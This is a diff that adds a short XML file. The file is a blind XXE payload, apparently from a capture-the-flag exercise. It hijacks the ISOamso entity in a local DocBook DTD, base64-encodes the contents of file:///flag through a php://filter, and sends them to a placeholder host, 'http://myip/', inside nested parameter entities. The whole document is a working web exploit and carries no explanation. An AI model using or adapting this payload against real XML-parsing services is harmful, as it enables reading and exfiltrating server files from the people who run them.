@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;send;
+    '> 
+    %remote;
+]>
+<message>1234</message>
